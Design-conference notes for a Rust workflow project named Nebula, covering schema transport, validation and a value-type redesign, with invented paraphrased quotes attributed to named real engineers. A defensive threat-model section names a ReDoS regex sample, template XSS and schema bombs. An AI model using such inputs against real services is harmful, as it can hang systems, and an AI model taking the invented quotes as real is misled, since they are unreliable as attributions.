# Design Conference Day 9 — Foundation Five re-revision

> Companion document to [VISION.md](./VISION.md) and
> [CONFERENCE-NOTES.md](./CONFERENCE-NOTES.md). Held on 2026-05-14
> evening at user request for **full Charter re-revision from zero** —
> every F-principle and every Accepted ADR open for challenge.
>
> Format follows Days 1-8: literary approximations of named individuals'
> public positions; not direct quotations.

**Frame:** Charter `VISION.md` (F1-F20 principles, §5 Action surface,
§4 SDK facade) and 14 ADRs (0042-0065, of which 8 Accepted after Day 8
reckoning) sit on the table. User invoked Charter re-revision — any
already-ratified item may be challenged.

**Six rounds, bottom-up:** schema → credential → resource → action →
plugin → cross-crate.

---

## Round 1 — `nebula-schema`

> **Status: CLOSED (2026-05-14).** All open points resolved by user
> verdicts; final panel poll raised no objections. F-numbering: user
> deferred, footnote default adopted (RC-13). Ready to proceed to
> Round 2.

### Brief

`crates/schema/`: 24 modules, 11K LOC, production-grade. Type-state
proof-token pipeline `Schema → ValidSchema → ValidValues →
ResolvedValues`. Closed-set vocabulary: `Field` (13), `Widget` (~17),
`InputHint` (~20), `Format` (~15). JSON-serializable schema export via
`schemars` feature + `x-nebula-*` annotations. Three-sibling boundary
with `nebula-validator` (rules) and `nebula-expression` (resolution).
Day 8 Accepted: **ADR-0058** (UI vocabulary), **ADR-0061** (core trait
ratification), **ADR-0062** (stdlib newtype zoo). Proposed:
**ADR-0063** (JSON Schema interop — scope narrows after Day 9 pivot).

### Panel

Henry Andrews · Ari Seyhun · Niko Matsakis · dtolnay · matklad ·
Aaron Turon · Esteban Küber · Cart · Brian Goetz *(new)* · Ralf
Jung *(new)* · Wes McKinney · Stjepan Glavina · Theo Browne *(new,
tRPC / T3 stack — client perspective)* · Sebastian McKenzie *(new,
Bun / Babel — schema-as-transport patterns)*.

### Frictions identified

| # | Friction | Open question |
|---|---|---|
| T1 | F11 framing | User pivot: schema export is **transport for client form rendering + sync validation**, not JSON Schema interop. Henry Andrews's framing rejected. |
| T2 | F15 three siblings | `Mode`/`Computed`/`Dynamic` blur schema ↔ validator ↔ expression — are three crates necessary? |
| T3 | F13 stdlib placement | 5 transitive crates (`url`/`uuid`/`regex`/`semver`/`humantime`) in Core layer; default ON (Aaron) vs OFF (Stjepan) — verdict pending compile-time measurement |
| T4 | `HasSchema` composability | Missing blanket impls for `Vec<T>`/`Option<T>`/`Box<T>` |
| T5 | `when` attribute form | 15 `when_*` atom variants vs `expr!()` proc-macro — verdict pending implementation cost vs DX gain |
| T6 | `ValidSchema` invariant | Can `ValidSchema` carry warnings? If yes → proof token contract weakened (Ralf Jung) |
| T7 | Proof-token DX | Real handler `?`-chain length — needs measurement audit (Brian Goetz) |
| T8 | Validation split | Sync (schema-expressible, client-runnable) vs async/custom (server-only) — must be explicit contract |
| T9 | F13 stdlib zoo | User pivot: NO predefined `Email`/`Url`/`Cron` newtypes. Universality > convenience. `InputHint` closed enum already covers standardized rendering/validation. |
| T10 | Schema version skew | Sebastian McKenzie — server updates schema, client caches stale; need `X-Nebula-Schema-Version` header in transport contract |
| T11 | Codegen target | Theo Browne — `nebula-cli codegen --target=typescript --schema=...` for end-to-end typed client; adoption multiplier |

### User-directed framing pivot (2026-05-14)

User clarified the purpose of JSON-serializable schema export. This
overrides Henry Andrews's "JSON Schema citizen" framing from earlier
in the session.

**Goal:** schema is the **transport contract** from server to client.
The client receives schema by API, then:

- Renders all form variants using `Field` + `Widget` + `InputHint`
- Runs **synchronous client-side validation** on each input
- Shows/hides fields per `when` conditions
- Marks required fields
- Hides secret fields

**Not goal:** being a citizen of the JSON Schema 2020-12 ecosystem;
accepting third-party JSON Schema input; integrating with arbitrary
JSON Schema tools.

Compatibility with JSON Schema 2020-12 dialect is a **side benefit**,
not a goal. `x-nebula-*` annotations are **mandatory** in our export;
our client depends on them. Third-party tools that read partial schema
without Nebula annotations work coincidentally, not by design.

### Validation split — contract

| Class | Description | Transport | Where executed |
|---|---|---|---|
| **Schema-expressible** | Sync, declarative: `required`, `min/max/length/pattern`, enum, type, `when` conditions, `Rule::Value`, `Rule::Predicate`, `Rule::Logic` | Included in JSON export | Client form widget + server (re-validate at submit) |
| **Code validators** | Async or custom: `Rule::Deferred`, manual `impl Validator`, any logic requiring I/O or private state | Marked in export as `x-nebula-async: true`, no body | Server only, at submit |

**Server-side re-validation is mandatory** — never trust client JSON.
Defense in depth. Already enforced in `nebula-credential` Phase 9
properties pipeline; must be explicit contract for `nebula-schema`.

### Options considered

- **A — Stay course + targeted fixes** (recommended)
- **B — Split `nebula-schema-stdlib` out** (Stjepan win, schema core minimal)
- **C — Merge validator into schema** (two siblings instead of three)

### Decisions (so far — Round 1 not closed)

**Option A working baseline.** F10-F16 stay (F11 reworded), with
patches:

1. **F11 reworded** *(user pivot)*: «`nebula-schema` ships
   JSON-serializable representation as **schema transport contract**
   for client form rendering, conditional visibility, and synchronous
   validation. Server-side re-validation mandatory at submit.
   Compatibility with JSON Schema 2020-12 dialect is best-effort side
   benefit, not goal. `x-nebula-*` annotations are mandatory in
   export.»
2. **F12/F16 reinforced** *(user pivot)*: closed-set discipline is
   absolute. No `Widget::Custom`, no `Field::Custom`, no escape
   hatches. Missing variants → ADR amendment + minor bump, gated by
   universal-applicability review.
3. **ADR-0063 scope narrowed**: export-only contract documentation.
   Import direction **dropped** — Nebula does not accept third-party
   JSON Schema. ADR rewrites to "Schema Transport Contract".
4. **`ValidSchema` invariant restored** *(Ralf Jung)*: `Schema::build()`
   returns `Result<(ValidSchema, LintWarnings), ValidationReport>`.
   Warnings travel beside proof token, not inside.
5. **Validation split contract** *(user pivot)*: schema export marks
   each rule with `x-nebula-async: true | false` so client knows what
   to validate locally vs defer to server. `Rule::Deferred` and custom
   `Validator` impls always async-flagged. Documented as
   load-bearing client/server contract.
6. **F13 stdlib zoo rejected** *(user pivot, 2026-05-14)*: no
   predefined `Email`/`Url`/`Cron`/`Uuid`/etc. newtypes shipped in
   `nebula-schema::stdlib`. Rationale: universality > convenience —
   any standardized definition becomes a flame war (which RFC variant
   for Email, which timezone semantics for Date, which cron dialect).
   Author writes their own newtype when domain warrants it; stdlib
   doesn't decide for them.

7. **Single Validation Language principle** *(user pivot, 2026-05-14,
   from T5)*: `nebula-validator`'s `Rule` / `Predicate` / `Logic` AST
   is the **only language** in which conditional visibility,
   validation, and dependent-field logic is expressed. Every
   `#[field(when_*)]` attribute compiles down to validator's `Rule`
   AST — these attributes are **syntactic sugar**, not a parallel
   syntax. No `expr!()` proc-macro. Users learn one language for
   validation across the entire system. Action items: DR1-16 (verify
   `when_*` → `Rule` lowering invariant in tests + docs).

8. **Schema Immutability per KEY+Version principle** *(user pivot,
   2026-05-14, from T10)*: the addressable unit of versioning is the
   `Action::KEY` / `Resource::KEY` / `Credential::KEY`, **not** the
   schema attached to it. For a given `(KEY, version)` pair, the
   schema is immutable across the deployment lifetime. When an
   upstream API changes its contract, the response is **a new
   Action** (or a major-version bump of the KEY) — the existing
   Action's schema does not silently mutate. This structurally
   prevents the "schema version skew" problem (Sebastian McKenzie's
   T10 concern) at the architecture level rather than detecting it
   at runtime via an HTTP header. Consequence for transport: clients
   identify which schema to use by `(KEY, version)`, not by hash or
   timestamp.
   - **`InputHint` closed enum** (`Email`, `Url`, `Cron`,
     `DateTime`, `Uuid`, …) remains the **standardized rendering and
     validation primitive**. Author writes `email: String` with
     `#[field(hint = "email")]` — gets uniform UI rendering and
     synchronous client-side format check across all Nebula plugins.
     No newtype mandated.
   - **Documentation** — `crates/schema/docs/NEWTYPE-PATTERNS.md`
     ships with 5 canonical recipes (Email, Url, Cron, Uuid, custom
     domain) so authors copy-adapt rather than fight a stdlib choice.
   - **Dependency cleanup**: `url`, `uuid`, `regex`, `semver`,
     `humantime` not added to `nebula-schema` deps. `nebula-schema`
     stays lean.
   - **ADR-0062 status**: Superseded by Day 9 (was Accepted on
     2026-05-14). No code rollback needed (never implemented).
   - **Charter §3 F13 deleted**; F-numbering preserved with F13
     reused for a different principle if needed, or left as gap with
     footnote (see RC-13).

### Open points resolved (2026-05-14 user verdicts)

- **T2 — three siblings (schema/validator/expression).** **ACCEPTED
  by user**: «каждый крейт несёт свою ответственность и может
  использоваться в других местах». Each crate has its own
  responsibility and may be consumed independently. F15 holds. Item
  closed.
- **T3 — stdlib granular subfeatures.** **MOOTED by T9 rejection of
  F13.** No stdlib zoo to flag-gate. Item closed.
- **T4 — type composability.** **RESOLVED (2026-05-14).** Code audit
  showed `type_infer.rs` already maps `Vec<T>` → `Field::List` and
  `Option<T>` → required-false; no blanket impl needed. Verdicts:
  - **`Field::Map` ADDED** as 14th `Field` variant. **User
    accepted** on the universality criterion (HTTP headers / query /
    env / tags / labels — domain-universal, not vendor-specific) and
    the wire-format argument (`List<Object{key,value}>` serializes to
    a JSON array, but external APIs expect a JSON object
    `{"k":"v"}`). All builders (n8n / Terraform / Dagster / Superset
    / NiFi) ship Map as a distinct type; none emulate via list.
    - **Naming**: `Field::Map` (NOT `KeyPair`). `KeyPair` is already
      taken by `nebula_credential`'s cryptographic scheme type
      (public/private key); reusing it would conflate dictionary
      fields with crypto keys. Also semantically wrong — "pair" = one
      pair; Map = many user-entered pairs.
    - **Design** (consolidated builder advice): `MapField { value:
      Box<Field>, min_entries: Option<u32>, max_entries: Option<u32>,
      key_pattern: Option<String> }`. Keys always `String` (Mitchell
      Hashimoto — don't generalize to arbitrary `K`). `value` carries
      inner schema with validation (Nick Schrock — `Map<String,
      Email>` validates each value). Duplicate-key rule built in from
      v1 (Maxime Beauchemin — bake it now, not later). JSON export →
      `additionalProperties: {value_schema}` (Henry Andrews —
      standard, clean).
  - **`Box<T>` recursion**: **deferred, design space reserved**
    (Samuel Colvin). Not implemented in v1.0; conditional rule trees
    / nested workflow logic in v2 will need it. Door NOT closed by
    design — when added, transport contract gains `$ref`+`$defs` and
    client renderer needs a `$ref` resolver (Henry Andrews cost
    note). Backlog seed **K-S1**.
  - **`Vec<Option<T>>`**: **rejected at macro-expansion** with
    diagnostic suggesting `Vec<T>` or `Option<Vec<T>>` (Samuel Colvin
    concurred — almost always a modeling mistake).
  - **`Option<Vec<T>>`**: **allowed** — normal "optional list".
  - **`Vec<Vec<T>>`**: **allowed** + integration test confirming the
    classifier handles nesting.
- **T5 — `expr!()` proc-macro vs `when_eq` atom syntax.** **REJECTED
  by user (with deeper principle)**: «нам не нужен мини-язык,
  потому что мы используем nebula-validator для валидации и для
  отображения по логике. Человеку не нужно думать какой синтаксис
  в другом случае. Для этого и создан мощный язык nebula-validator».
  **Principle ratified — "one validation language across the
  system":** `nebula-validator`'s `Rule`/`Predicate`/`Logic` is the
  **single source of conditional and validation syntax** for the
  entire stack. Field-attribute atoms (`when_eq` / `when_in` /
  `when_ne` / `when_gt`) **must compile down to `Rule::Predicate`
  / `Rule::Logic` AST** — they are **syntactic sugar over
  `nebula-validator`**, not a parallel mini-language. No `expr!()`
  proc-macro. No second syntax for users to learn. DR1-2 stays
  deleted. New action item DR1-16 added: document and verify that
  every `#[field(when_*)]` expansion produces exactly the equivalent
  validator `Rule` AST.
- **T6 — `ValidSchema` warnings split.** **ACCEPTED by user** (after
  expanded explanation): «да, думаю я принимаю их идею». Ralf Jung's
  invariant ratified — `Schema::build()` returns
  `Result<(ValidSchema, LintWarnings), ValidationReport>`. `ValidSchema`
  proof token now means **exactly zero errors**; warnings travel in a
  separate channel. ~30 LOC patch in `crates/schema/src/schema.rs` +
  `lint.rs`; all callsites migrate `let s = build()?` →
  `let (s, _w) = build()?`. DR1-1 confirmed active.
- **T7 — DX audit (`PIPELINE-DX.md`).** **REJECTED by user**: «большая
  часть работы скрыта будет за ядром и разработчику не нужно думать
  сколько `?`. Всё это будет происходить до execute». The schema
  pipeline (lint → validate → resolve) is **engine-driven, hidden
  from plugin authors**. The author writes `async fn execute(input:
  Input) -> Result<Output>` — `Input` is already typed, validated,
  resolved by the engine before `execute` runs. Brian Goetz's
  monadic-DX concern is mooted: authors never compose pipeline
  steps. DR1-5 removed. Item closed.
- **T8 — validation split documentation.** Accept; this is part of
  decision 5 above (V-class export contract).
- **T9 — F13 stdlib zoo rejection.** Accepted by user pivot.
  Decision 6 above ratifies. Item closed.
- **T10 — Schema version skew header.** **REJECTED by user (with
  deeper architecture)**: «а зачем так версии схем то? Если схемы
  будут принадлежать Action, Credential, Resource и они могут
  иметь различные версии — там уже мы будем получать разные
  схемы. Если по интеграции сменился API — мы сделаем другой
  просто Action». **Principle ratified — "schema is immutable per
  Action/Resource/Credential KEY+version":** the addressable unit
  of versioning is the `Action::KEY` (or Resource/Credential KEY),
  not the schema. A schema does not silently update — if the
  underlying integration's contract changes, a new Action with a
  new KEY (or a major-version bump of the existing KEY) ships
  alongside the old. Clients dispatch by KEY; the schema attached
  to a given KEY is **immutable for the lifetime of that version**.
  Sebastian McKenzie's version-skew problem is structurally
  prevented, not detected at runtime. DR1-12 removed. Item closed.
- **T11 — TypeScript codegen.** **REJECTED by user**: «если мы
  сериализуем в JSON и там уж разберёмся — и не надо нам никакая
  генерация». JSON export is sufficient; downstream clients in any
  language consume the JSON directly (or use third-party tooling
  like `json-schema-to-typescript`). Nebula does not maintain
  per-language code generators. Theo Browne's adoption-multiplier
  pitch acknowledged but declined: maintaining codegen targets for
  TS / Python / Java / Go / etc. is open-ended scope creep. DR1-11
  removed. Item closed.
- **F11 wording** *(transport contract)*. **ACCEPTED by user**: «да,
  всё как бы верно: когда мы рисуем Node, мы получаем схему Action,
  потом рисуем его и скрываем/показываем поля и валидируем. Потом
  сохраним — это проверится на сервере ещё раз и так же проверятся
  кастомные валидации, так как их нельзя сериализовать». User's
  description matches F11 formulation. Item closed.
- **T12 — Map vs recursion separation** *(Mark Payne)*. **Accepted.**
  `Field::Map` (fixed value schema, dynamic entries) and recursive
  nesting (`Box<T>`, deferred) are **distinct concepts** in design
  docs and code; not conflated. Documented in NEWTYPE-PATTERNS.md and
  the Map design ADR.
- **T13 — ordered field/section serialization** *(Maxime Beauchemin
  + Nick Schrock)*. **Accepted as transport invariant.** Schema
  export MUST preserve declared field order and `section` grouping
  deterministically. No HashMap-ordered serialization. Client renders
  the same layout every time. One-line invariant, explicitly
  contracted in ADR-0063 rewrite + property test.
- **T14 — error message templates in export** *(Samuel Colvin)*.
  **Accepted.** Sync-validation error messages travel in the schema
  export as templates (`"must be at least {min} characters"`); the
  client substitutes values, never authors its own wording. Prevents
  message fragmentation across renderers. Part of the V-class
  export contract (decision 5) + ADR-0063.

### Rejected (final)

- **`Widget::Custom`** *(user pivot)*: Cart's escape hatch dropped.
  F12/F16 closed-set discipline is absolute.
- **JSON Schema lossless import** *(user pivot)*: out of scope.
  ADR-0063 rewrites to export-only Schema Transport Contract.
- **F13 stdlib newtype zoo** *(user pivot)*: no predefined `Email` /
  `Url` / `Cron` / `Uuid` shipped in `nebula-schema`. ADR-0062
  Superseded. Universality and avoiding RFC-variant flame wars take
  priority over zoo convenience.
- **`define_newtype!` macro** *(consequence of T9)*: not added.
  Author uses `#[derive(Schema, Deserialize)] + impl Validate` —
  same idiomatic Rust as any other domain type, no Nebula-specific
  helper.
- **`$schema` set to JSON Schema 2020-12 URI in export** *(Henry
  Andrews's nit)*: use `$schema: "https://nebula.dev/schema/v1"`
  instead. Honest signal — we are a schema dialect, not a JSON
  Schema citizen.
- **Option B** (split stdlib crate): mooted by F13 rejection.
- **Option C** (merge validator): `Validated<T>` already used outside
  schema. F15 holds.
- **`#[diagnostic::do_not_recommend]`** on `HasSchema` blanket impls —
  premature; defer until benchmark shows compile bottleneck.

### Notable quotes

- **User** *(framing pivot, closed-set)*: «We are not building custom
  Field support. We do not know how to render it; we must hold one
  rendering style and one validation style. If a Field variant is
  missing — bring the proposal, we will discuss universal applicability
  and add it through proper review.»
- **User** *(JSON Schema framing)*: «Schema export is for the client to
  render forms and run sync validation. Async / custom validators run
  on the server at submit, also for security re-check.»
- **User** *(stdlib rejection)*: «We do not need ready-made stdlib
  templates. You cannot please everyone. We must preserve universality
  and ergonomics.»
- **Aaron Turon** *(accepts loss)*: «I argued for the zoo. The
  operative virtue here is universality — Email-validation flame
  wars are real, and any stdlib pick alienates the half that prefers
  the other RFC. Accept the rejection. The `InputHint` enum already
  carries the standardized rendering and sync-validation primitives;
  authors write their own newtype if domain warrants.»
- **Niko Matsakis**: «Documentation page «How to write your own
  newtype: 5 patterns» — Email/Url/Cron/etc. as examples in docs,
  not as shipped code. Reader learns the idiom, copies, adapts.
  Better than stdlib because no Nebula-specific definition exists
  for them to fight with.»
- **Stjepan Glavina**: «My deps concern is resolved by the
  user's pivot, not by my compromise. Cleaner outcome.»
- **Theo Browne** *(new)*: «Schema-as-transport — that's the way.
  Strong recommendation: ship `nebula-cli codegen --target=typescript`
  that emits TS types + Zod runtime from the schema export. Without
  it, your client side either writes types twice or trusts unsafe.
  This is an adoption multiplier.»
- **Sebastian McKenzie** *(new)*: «Schema version skew is the
  silent killer. Server bumps schema, client cache holds the old.
  Bake `X-Nebula-Schema-Version` into the transport contract from
  v1.0. Client compares, refetches on mismatch. Five lines of design
  that save five incident reports.»
- **Ralf Jung**: «If `ValidSchema` carries warnings, it is not a proof
  token — it is a 'mostly valid' token. The type system does not
  distinguish those. Split the channels.»
- **Brian Goetz**: «Measure before you decide. Monads in Rust either
  work through `?` or they are LARPing.»
- **Henry Andrews** *(after pivot)*: «Use `$schema:
  "https://nebula.dev/schema/v1"`, not the JSON Schema URI. Honest
  signal. Otherwise downstream readers expect compliance you do not
  promise.»

### Charter impact (working)

- **F11 reword** — transport contract framing (user pivot); §3 patch.
- **F12/F16 reinforced** — explicit "no escape hatches"; §3 wording
  tightened.
- **F13 deleted** — stdlib zoo rejected; charter §3 patch removes F13
  entirely. F-numbering: either renumber F14-F20 down (cost: every
  downstream reference) or leave F13 as a documented gap with a
  footnote (preferred — minimal churn). RC-13 tracks the choice.
- **New principle (Single Validation Language)** — to be added to
  charter §3 as new F-entry: «`nebula-validator`'s Rule AST is the
  single language for conditional visibility, validation, and
  dependent-field logic across the entire system. Field-attribute
  shortcuts compile down to it; no parallel syntax.»
- **New principle (Schema Immutability per KEY+Version)** — to be
  added to charter §3 as new F-entry: «Schema attached to a
  `(KEY, version)` pair is immutable for the lifetime of that
  version. Upstream API change → new Action / new KEY, not silent
  schema mutation.»
- **ADR-0062 Superseded** by Day 9 — header gets `Status: Superseded
  by Day 9 (2026-05-14) — stdlib zoo rejected on universality
  grounds`.
- **ADR-0063 rewrite** — Schema Transport Contract, export-only.
  `$schema` URI changes to `https://nebula.dev/schema/v1` per Henry
  Andrews's honesty nit. **Schema version header REMOVED** from
  ADR scope (T10 rejection).
- **ADR-0061 amendment** — `Schema::build()` signature change
  *(pending — T6 undecided)*.
- **ADR-0058 unchanged** (closed `Widget` enum; atomic `when_*`
  syntax retained, documented as `Rule` sugar per T5 principle).

### Action items (current)

- **DR1-1** — ADR-0061 amendment (build signature, LintWarnings).
- **DR1-2** — ~~ADR-0058 v2~~ — **deleted** (atomic `when_*` retained
  for v1.0).
- **DR1-3** — ADR-0063 rewrite to "Schema Transport Contract"
  (export-only, import dropped, `$schema` URI changed).
- **DR1-4** — `has_schema.rs` blanket impls (Vec/Option/Box) + tests.
- **DR1-5** — `crates/schema/docs/PIPELINE-DX.md` real-handler audit.
- **DR1-6** — ~~granular stdlib features~~ — **mooted** by F13
  rejection.
- **DR1-7** — ~~`Widget::Custom`~~ — **deleted** (closed-set absolute).
- **DR1-8** — `#[diagnostic::on_unimplemented]` on `HasSchema`.
- **DR1-9** — ~~compile-time benchmark for stdlib~~ — **mooted** by
  F13 rejection.
- **DR1-10** — `crates/schema/docs/VALIDATION-SPLIT.md` — sync
  (client) vs async (server) contract, `x-nebula-async` annotation,
  mandatory server re-validation.
- **DR1-11** — ~~TypeScript codegen~~ — **REJECTED by user** (T11).
- **DR1-12** — ~~Schema version header~~ — **REJECTED by user** (T10).
- **DR1-13** — `crates/schema/docs/NEWTYPE-PATTERNS.md` — five
  canonical recipes (Email, Url, Cron, Uuid, custom domain) as
  copy-adapt documentation; no stdlib code shipped. (Niko Matsakis's
  proposal in lieu of stdlib zoo.)
- **DR1-14** — ADR-0062 header rewrite to `Status: Superseded by
  Day 9` with rationale paragraph.
- **DR1-15** — Charter §3 patch: delete F13, add footnote explaining
  numbering gap (RC-13). *(F-numbering verdict pending.)*
- **DR1-16** — Single Validation Language invariant: every
  `#[field(when_eq/when_in/when_ne/when_gt)]` attribute expansion
  emits the equivalent `nebula_validator::Rule::Predicate` /
  `Rule::Logic` AST node. Verified by macro-expansion test fixtures
  in `crates/schema/macros/tests/when_to_rule_lowering.rs`. Document
  the principle in `crates/schema/docs/VALIDATION-LANGUAGE.md` —
  one validation language across the system, atoms are sugar.
- **DR1-17** — Charter §3 add new F-entry "Single Validation
  Language" (place TBD per F-numbering verdict).
- **DR1-18** — Charter §3 add new F-entry "Schema Immutability per
  KEY+Version" (place TBD per F-numbering verdict).
- **DR1-19** *(new)* — `Field::Map` 14th variant: `MapField` struct
  (`value: Box<Field>`, `min_entries`, `max_entries`, `key_pattern`,
  string keys only), `MapWidget`, validation (per-value + duplicate
  key + entry count), serde (JSON object wire format), JSON export →
  `additionalProperties`. ADR seed **ADR-0069** (Field::Map design).
  Closed-set discipline: this is a deliberate, ADR-gated addition,
  not an escape hatch.
- **DR1-20** *(new)* — `type_infer.rs`: map `HashMap<String, V>` /
  `BTreeMap<String, V>` → `FieldKind::Map(Box<FieldKind>)`; reject
  `Vec<Option<T>>` with diagnostic; explicit `Option<Vec<T>>` and
  `Vec<Vec<T>>` handling + tests.
- **DR1-21** *(new)* — transport ordered-serialization invariant
  (T13): declared field order + `section` grouping preserved in
  export; property test guards it. Folds into ADR-0063 rewrite.
- **DR1-22** *(new)* — error-message-template export (T14): sync
  validation messages travel as templates; client substitutes only.
  Folds into ADR-0063 rewrite + V-class contract.
- **DR1-23** *(new)* — backlog seed **K-S1**: recursive schema via
  `Box<T>` + `$ref`/`$defs` transport + client `$ref` resolver.
  Design space reserved, not implemented in v1.0.

---

## Round 1 — Deep Re-examination (continued 2026-05-14)

> User requested the audience think harder about `nebula-schema`
> cases/scenarios. Assistant ran proactive adversarial + edge-case
> analysis (per feedback_adversarial_security_review). Round 1
> framing decisions stand; this adds implementation depth.

### Critical gap A — client-side validator execution

Round 1 said "sync validation runs on the client" without
specifying HOW a Rust `nebula-validator::Rule` AST executes in a
browser. Three options surfaced: (1) JS re-interpreter of `Rule`
(drift risk), (2) downgrade to standard JSON Schema validation
(loses cross-field power), (3) `nebula-validator` → WASM
(identical to Rust, +payload/cold-start).

**DECIDED by user: WASM validator.** «Скорее будет nebula-validator
компилироваться в WASM; своё решение на клиенте маловероятно —
2 кода в голове = drift.» Aligns with
feedback_type_enforce_not_discipline (structural identity, not
discipline). Lin Clark / Colin McDonnell / Theo Browne consensus:
only WASM removes client/server validation drift. NOT in conflict
with the no-WASM-plugins charter stance — this is WASM solely for
the client-side validator, a different concern.

Action items:
- **DR1-24** — `nebula-validator` `wasm32-unknown-unknown` target;
  client-side validator artifact; size budget (~50-100KB); lazy
  load.
- **DR1-25** — WASM validator version pinned to schema `(KEY,
  version)` (Schema Immutability principle); mismatch → refetch
  (Sebastian McKenzie).
- **DR1-26** — transport contract documents: sync validation =
  WASM-`nebula-validator`; server re-validates identically (same
  crate, native).

### Critical gap B — `HasSchema::schema()` owned clone = discipline perf

ADR-0061 returns owned `ValidSchema`, "caller may cache via
`OnceLock`". Discipline-based — violates
feedback_type_enforce_not_discipline. Consensus (Niko Matsakis,
matklad, Ralf Jung): `#[derive(Schema)]` emits `static SCHEMA:
LazyLock<ValidSchema>`; `schema() -> &'static ValidSchema`. Owned
form kept as `schema_owned()` for rare cases. Borrowed proof token
is not weaker (Ralf Jung). **Recommend accept** — ADR-0061
amendment. Action: **DR1-27**.

### Critical gap C — schema as attack surface (untrusted plugin)

Schema authored by untrusted plugin, serialized, sent to client.
Vectors (Filippo, Armin Ronacher, Tony Arcieri, Esteban):
- **ReDoS** — `#[field(pattern="(a+)+$")]` hangs client (JS RegExp
  backtracks) and server. Need regex complexity budget + client-safe
  form.
- **Error-template XSS** (our T14) — templates sent to client; if
  rendered as HTML → stored XSS. Templates MUST be data, client
  renders as textContent never innerHTML.
- **Schema bomb** — deep `Object`×`List`×`Map` → 50MB schema /
  render recursion. Registration-time max depth/fields/size limits.
- **Default value leak** — `#[field(default="sk_live_…")]` → schema
  export → logs. Lint: `secret` field with non-empty default →
  registration error; entropy scan defaults.
- **Dynamic/Computed injection** — `Field::Dynamic` Loader output
  must pass same limits/lint at resolve, not only registration.

**Recommend accept as a schema-side security block** (analog of
Interlude II). Action items **DR1-28..DR1-32** (one per vector).

### DX edge cases (new)

| # | Case | Recommendation |
|---|---|---|
| E1 | `required`+`when`-hidden deadlock | `required` applies only when field visible; hidden required does not block submit |
| E2 | `Field::Mode` forward-compat | unknown variant → graceful (raw + warning), not panic; `#[non_exhaustive]` transport semantics |
| E3 | numeric precision (financial) | f64-only excludes fintech/factory money math → **`Decimal` needed** (feeds Round V) |
| E4 | unicode length | `min/max_length` = grapheme clusters (user-perceived), spec'd; JS `.length` ≠ Rust `.len()` reconciled |
| E5 | empty vs null vs absent | spec: absent=None, null=None, ""=Some(""); else client/server drift (feeds Round V) |
| E6 | saved workflow + KEY bump | old workflow pinned to old schema KEY or explicit migrate; no silent re-bind (Maxim Fateev `MigratesFrom`) |

E3 and E5 point at a deeper substrate question → **Round V**.

---

## Round V — Value substrate (`nebula-value` vs `serde_json::Value`)

> Raised by user 2026-05-14: «я когда-то вместо serde делал свой
> nebula-value, в git history есть код — обсудим перед аудиторией:
> принять, делать, или возвращать.»

### History (git, verified)

- `nebula-value` existed: ~39k LOC custom value system. Scalars
  `Null/Boolean/Integer(i64)/Float(f64)/Decimal(arbitrary)/Text(Arc<str>)/Bytes(bytes::Bytes)`;
  native temporal `Date/Time/DateTime/Duration`; persistent
  collections `im::Vector`/`im::HashMap`; zero-copy Arc cloning;
  built-in DoS limits.
- Commit `aa7792bf` (Feb 11 2026): `refactor!: migrate from
  nebula-value to serde_json::Value` — removed entirely,
  "eliminates ~39k lines". Current state: `serde_json::Value`
  everywhere.

### What `serde_json::Value` cannot do (intersects deep re-exam findings)

| Need | serde_json::Value | nebula-value had it | Surfaced as |
|---|---|---|---|
| Arbitrary-precision decimal | f64 only | `Decimal` | E3 (financial) |
| Native bytes, zero-copy | base64 string | `Bytes(bytes::Bytes)` | Charter P5 streaming |
| Native temporal | string | Date/Time/DateTime/Duration | E-class |
| Stable object ordering | needs `preserve_order` | (im::HashMap — actually NOT ordered; gap) | T13 |
| Zero-copy node→node clone | deep copy | Arc-based O(1) | perf |
| Built-in DoS limits | none | yes | gap C |
| Expression placeholder | not modeled | (MaybeExpression sibling) | nebula-expression |

The Feb rollback bought simplicity (−39k LOC, serde ecosystem) but
removed capabilities now resurfacing as real gaps for fintech /
factory / streaming workloads.

### Options

- **A — Stay `serde_json::Value`** (status quo). Simple, 0
  maintenance, full serde ecosystem. Cost: no exact Decimal
  (financial domain dead), bytes=base64, temporal=string, ordering
  fragile, deep clone.
- **B — Restore `nebula-value` wholesale** (39k LOC). Everything
  covered. Cost: maintenance burden that caused the rollback,
  ecosystem friction (conversion at every boundary), compile time.
- **C — Hybrid: `serde_json::Value` + targeted newtypes**
  (`Decimal`/`Bytes`/`DateTime` only where critical). Minimal
  custom code. Cost: no single Value enum, conversions, fragments.
- **D — New lean `nebula-value`** — do NOT restore 39k LOC; redesign
  minimal from lessons: only what serde_json::Value genuinely
  cannot (Decimal, Bytes, ordered Object, expression placeholder,
  DoS limits), serde-interop-first. Targeted, smaller.

### Audience round held + ТЗ written (2026-05-14)

User directed: convene the audience and write a technical
specification for the new `nebula-value`, answering five questions.
Real removed code (not the README) was shown to the panel
(`core/value.rs:21` enum, `Cargo.toml` deps, 38-file tree).

**Decisions (Round V conference):**

| Q | Decision |
|---|---|
| Q1 — layer | `nebula-value` = new **Foundation-zero** layer below Core; zero `nebula-*` deps except `nebula-error`; one-way `value ← validator ← schema ← expression`; the cycle that disabled the old crate's validator dep is structurally impossible |
| Q2 — Secret | **NO extractable `Value::Secret`** (would break Interlude II); secret stays in `nebula-credential` (§12.5); only a non-extractable `Value::Redacted` marker for safe display/log |
| Q3 — validator | one-way dependency; `Validate`/`Validated<Value>` in validator; explicit **versioned frozen serde spec** (not derive) for durable execution |
| Q4 — schema types | idiomatic **Rust** types (String/iN/bool/Vec/Option/HashMap); **our** types only where Rust is weak (`Decimal`/temporal/`Bytes`), explicit; extends existing `type_infer.rs`; serde just works |
| Q5 — DX | `Value` hidden by derive; serde-compatible; progressive disclosure; zero-copy Arc clone; typed conversion errors; `#[non_exhaustive]` forward-compat |

**Fixes derived from inspecting the real code:** `Object` →
`IndexMap` not `im::HashMap` (fixes the T13 ordering bug present in
the old crate); `#[non_exhaustive]` (Arrow B-02 later, no break);
drop `ops/diff/path/schema/concurrency` (this is what bloated 39k →
target ~2-4k LOC, CI-budgeted); zero crypto deps (keeps Interlude II
intact).

**Full ТЗ:** [`docs/superpowers/specs/2026-05-14-nebula-value-v2-design.md`](./superpowers/specs/2026-05-14-nebula-value-v2-design.md)
— 12 sections, decision log, open questions OQ-1…OQ-5.

**Verdict: Option D (lean redesign), specified.** Not A (kills
financial + P5 streaming), not B (repeats 39k maintenance failure),
not C (fragments value model).

### Ecosystem evidence gathered (2026-05-15, primary sources)

User directed research before finalizing ("как делают другие — Polars
делал своё?"). Verified survey (docs.rs / GitHub / project blogs):

| Project | Custom | Decimal | Bytes | Temporal | Ordered map |
|---|---|---|---|---|---|
| Polars `AnyValue` | Y | i128(p,s) | Y | Y | Arrow |
